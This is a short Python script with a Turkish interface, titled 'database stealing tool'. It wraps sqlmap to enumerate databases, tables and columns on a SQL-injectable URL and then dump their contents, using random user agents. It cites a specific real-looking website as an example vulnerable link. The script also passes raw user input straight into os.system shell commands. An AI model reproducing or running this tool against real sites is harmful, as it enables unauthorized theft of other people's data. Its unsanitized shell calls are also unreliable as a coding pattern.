#!/usr/bin/env python

import os 
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet VERI TABANI CALMA")
print("""
Veri Tabanı Çalma Aracına Hoş  Geldiniz... :)

1) Sadece Açıklı Linki Biliyorsanız
2) Açıklı Linki ve Veritabanı Adını Biliyorsanz
3) Açıklı Linki, Veritabanı Adını ve Tablo Adını Biliyorsanız
4) Açıklı Linki, Veritabanı Adını, Tablo Adını ve Colon Adını Biliyorsanız

Örnek Açıklı Link: http://www.suesupriano.com/article.php?id=25

""")

islemno = input("İşlem Numarasını Giriniz: ")

if(islemno == "1"):
	aciklilink = input("Açıklı Linki Girin: ")
	os.system("sqlmap -u " + aciklilink + " --dbs --random-agent")
elif(islemno == "2"):
	aciklilink = input("Açıklı Linki Girin: ")
	veritabani = input("Veritabanı Adını Girin: ")
	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " --tables --random-agent")
elif(islemno == "3"):
	aciklilink = input("Açıklı Linki Girin: ")
	veritabani = input("Veritabanı Adını Girin: ")
	tablo = input("Tablo Adını Girin: ")
	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " --columns --random-agent")
elif(islemno == "4"):
	aciklilink = input("Açıklı Linki Girin: ")
	veritabani = input("Veritabanı Adını Girin: ")
	tablo = input("Tablo Adını Girin: ")
	colon = input("Colon Adını Girin: ")
	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " -C " + colon + " --dump --random-agent")
else:
	print("Hatalı Giriş Yaptınız...")
